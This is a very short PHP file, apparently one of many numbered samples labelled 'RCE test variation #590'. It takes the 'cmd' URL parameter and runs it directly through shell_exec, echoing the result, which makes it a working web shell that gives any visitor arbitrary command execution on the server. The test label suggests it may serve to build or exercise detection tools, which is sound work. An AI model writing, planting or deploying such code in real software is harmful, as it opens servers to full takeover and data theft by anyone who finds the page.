<?php
// RCE test variation #590
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>